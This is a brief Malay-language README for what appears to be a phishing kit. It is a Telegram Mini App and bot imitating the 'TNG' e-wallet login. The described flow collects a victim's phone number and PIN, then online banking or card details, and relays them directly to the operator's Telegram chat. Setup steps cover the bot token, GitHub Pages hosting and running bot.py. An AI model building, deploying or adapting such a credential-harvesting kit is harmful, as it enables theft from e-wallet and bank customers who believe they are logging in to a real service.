# 🤖 TNG Telegram Mini App + Bot

## 📋 Aliran
1. Buka bot → tekan butang Mini App
2. Isi nombor + PIN → tekan Log In
3. Data terus dihantar ke Telegram
4. Pilih Online Banking atau Card Payment
5. Data sampai terus ke chat bot ✅

## ⚙️ Cara Guna
1. Dapatkan Token Bot dari @BotFather
2. Ganti `BOT_TOKEN` dalam `bot.py`
3. Aktifkan GitHub Pages → dapat URL
4. Sambung URL ke Mini App dalam @BotFather
5. Jalankan `bot.py` (guna Replit atau komputer)
